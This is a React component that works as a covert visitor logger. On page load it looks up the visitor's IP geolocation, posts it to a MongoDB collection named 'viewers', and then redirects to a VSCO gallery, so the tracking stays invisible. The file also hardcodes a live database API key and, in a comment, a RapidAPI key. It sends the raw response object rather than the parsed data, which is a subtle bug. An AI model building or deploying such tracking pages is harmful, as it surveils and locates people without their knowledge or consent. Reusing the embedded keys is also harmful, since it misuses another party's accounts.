import { useEffect } from "react";


function App() {

  
  useEffect(() => {

    const fetchData = async () => {
      try {

        const response = await fetch('https://ipapi.co/json'


        // Just in case I want to add headers  https://ipapi.co/json
            // , { 
            //   method: 'GET',
            //   headers: {
            //     'X-RapidAPI-Key': '617613e6b7msh38a292b67a972c1p1fc264jsn5c45f98f2a6b',
            //     'X-RapidAPI-Host': 'ip-geo-location.p.rapidapi.com'
            //   }}
        );

       

        if (response.ok) {
          const data = await response.json();

          var myHeaders = new Headers();
          myHeaders.append("Content-Type", "application/json");
          myHeaders.append("Access-Control-Request-Headers", "*");
          myHeaders.append("api-key", "6mFTEKpTOfwDxviNKcDbYtn7ZIV5X9j1ZLEVDLRj04wB9ExbCVtnirJtVnH2123n");
          myHeaders.append("Access-Control-Allow-Origin", "*");
          
  
          var raw = JSON.stringify({
            "dataSource": "Cluster0",
            "database": "viewers",
            "collection": "VSCO",
            "document": response
          });
  
          var requestOptions = {
            method: 'POST',
            headers: myHeaders,
            body: raw,
            redirect: 'follow',
            // mode: 'no-cors'
          };
  
          const db_send = await fetch("https://us-east-1.aws.data.mongodb-api.com/app/data-nwgff/endpoint/data/v1/action/insertOne", requestOptions)
          // Redirect to the VSCO website
          window.location.href = 'https://vsco.co/hiten1409/gallery';
        } else {
          throw new Error('API request failed');
        }
      } catch (error) {
        console.error(error);
      }
    };

    fetchData();
    }, []);


  return (
    <div className="App">
    </div>
  );
}

export default App;
